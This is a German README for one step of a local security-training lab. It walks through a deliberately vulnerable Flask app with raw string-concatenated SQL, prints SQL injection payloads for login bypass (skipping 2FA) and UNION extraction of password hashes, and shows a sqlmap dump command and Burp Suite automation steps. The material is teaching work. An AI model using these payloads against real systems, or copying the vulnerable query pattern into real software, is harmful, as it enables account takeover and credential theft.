# Ordner 05 — SQL-Injection-Szenario (⚠️ absichtlich verwundbar)

> Nur lokal auf `127.0.0.1`, nur gegen diese Lab-App. Fix in **Ordner 07**.

Fünfte Stufe. Zwei bewusst unsichere Stellen mit **Roh-SQL (String-Verkettung)**:

| Route | Lücke | Klassischer Payload |
|-------|-------|---------------------|
| `/search` | UNION-/Boolean-Injection | `%' UNION SELECT username, password_hash FROM users --` |
| `/login-legacy` | Auth-Bypass (umgeht 2FA!) | Benutzername: `' OR '1'='1' --` |

Der Rest der App (ORM, `filter_by`) bleibt sicher — das ist der Lerneffekt: **nicht
Flask ist unsicher, sondern String-Verkettung in SQL.**

## Vorbereitung: Testdaten anlegen
```powershell
python -m venv .venv; .venv\Scripts\activate
pip install -r requirements.txt
python seed.py        # legt alice/bob mit Hashes an
python app.py
```

## Angriff 1 — Auth-Bypass (`/login-legacy`)
Die App baut:
```sql
SELECT id, username FROM users WHERE username = '<eingabe>' AND password_hash = '...'
```
Benutzername = `' OR '1'='1' --` ergibt:
```sql
SELECT id, username FROM users WHERE username = '' OR '1'='1' --' AND ...
```
`--` kommentiert den Rest weg, `'1'='1'` ist immer wahr → erster User wird eingeloggt,
**ohne Passwort und ohne 2FA**.

## Angriff 2 — Datenextraktion (`/search`)
Die App baut `... WHERE username LIKE '%<eingabe>%'`. Mit einem UNION holt man
beliebige Spalten in die Ergebnisliste — z. B. die **Passwort-Hashes**, die dann in
Ordner 06 mit Hashcat/OphCrack offline geknackt werden.

## Handhabung mit Burp Suite
1. **Proxy** an (Burp), Browser über Burp leiten (FoxyProxy `127.0.0.1:8080`),
   Burp-CA-Zertifikat importieren.
2. Suche/Login absenden → Request in **Proxy → HTTP history**.
3. Rechtsklick → **Send to Repeater**. Dort das Feld (`q` bzw. `username`) editieren
   und Payloads iterieren, ohne jedes Mal den Browser zu bedienen.
4. **Send to Intruder** → Position auf das Feld, Payload-Liste (z. B. aus SVNDigger
   oder einer SQLi-Wortliste) → automatisiert durchprobieren; auf abweichende
   **Length/Status** in den Responses achten (Boolean-based).
5. CSRF-Token: `/search` nutzt WTF-CSRF. In Burp den `csrf_token`-Wert des GET-Formulars
   mitschicken, oder direkt die GET-Variante `/search?q=...` verwenden (kein Token nötig).

> Automatisierung pur: `sqlmap -u "http://127.0.0.1:5000/search?q=x" --cookie="session=..." --dump`
> — nur gegen diese lokale Lab-App.

## Nächste Schritte
- **Ordner 06:** die extrahierten Hashes offline knacken (Hashcat/OphCrack).
- **Ordner 07:** der Fix — parametrisierte Queries (`text()` mit `:param`), plus
  `bandit -r` und `detect-secrets` als automatische Prüfung.

## Natürlicher Vektor: die Pony-Suche
Realistischer als die künstliche User-Suche ist die **Pony-Suche** im Shop
(`ponies.py`): `GET /ponys?q=...` baut die SQL per String-Verkettung. Payloads z. B.:
```
/ponys?q=%' UNION SELECT id, username, password_hash, 1, 1, 1 FROM users --
/ponys?q=%' OR '1'='1
```
Die Seite zeigt die ausgeführte Query an. `/pony/<id>` bleibt bewusst ORM (sicher),
damit der Kontrast sichtbar ist. Der alte `/search`/`/login-legacy` existiert weiter
als (unverlinktes) Demo-Endpoint.
